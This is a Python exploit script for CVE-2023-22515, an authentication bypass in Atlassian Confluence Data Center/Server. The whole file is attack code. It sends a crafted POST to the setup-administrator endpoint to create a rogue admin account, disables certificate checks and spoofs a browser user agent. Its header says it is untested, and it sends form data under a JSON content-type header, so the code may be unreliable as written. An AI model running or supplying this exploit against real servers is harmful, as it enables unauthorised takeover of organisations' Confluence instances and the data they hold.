"""
CVE: 2023-22515
Tested on: Currently Untested on Atlassian Confluence Data Center / Server 8.0.0 - 8.5.3
Description: Exploits an authentication bypass vulnerability in Confluence that allows an attacker to create admin users.
"""

import sys
import requests
import argparse
import urllib3

# Disable SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# setting up a user agent, so we can pretend this is coming from a real web browser
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Content-Type": "application/json"
}

# Command-Line Argument parser setup
def parse_args():
    parser = argparse.ArgumentParser(description="CVE-2023-22515 Confluence Auth Bypass Admin Creation Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target Confluence URL (e.g., https://target.com)")
    parser.add_argument("--username", default="fakeadmin", help="Username for new admin account")
    parser.add_argument("--password", default="Password123!", help="Password for new admin account")
    return parser.parse_args()

# Exploitation function
def exploit(target_url, username, password):
    # Make sure URL is properly formatted
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        print("[-] Error: URL must start with http:// or https://")
        sys.exit(1)

    target_url = target_url.rstrip("/") + "/setup/setupadministrator.action"

    print(f"[*] Targeting: {target_url}")

    # Build the payload
    payload = {
        "username": username,
        "fullName": username,
        "email": f"{username}@example.com",
        "password": password,
        "confirm": password
    }

    try:
        response = requests.post(target_url, data=payload, headers=headers, verify=False, timeout=10)

        if "dashboard" in response.text or response.status_code == 302:
            print("[+] Admin account created successfully!")
            print(f"[+] Username: {username}")
            print(f"[+] Password: {password}")
        else:
            print("[-] Exploit may have failed. Check target manually.")
            print(f"[HTTP {response.status_code}]\n{response.text[:300]}")

    except requests.RequestException as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    args = parse_args()
    exploit(args.url, args.username, args.password)
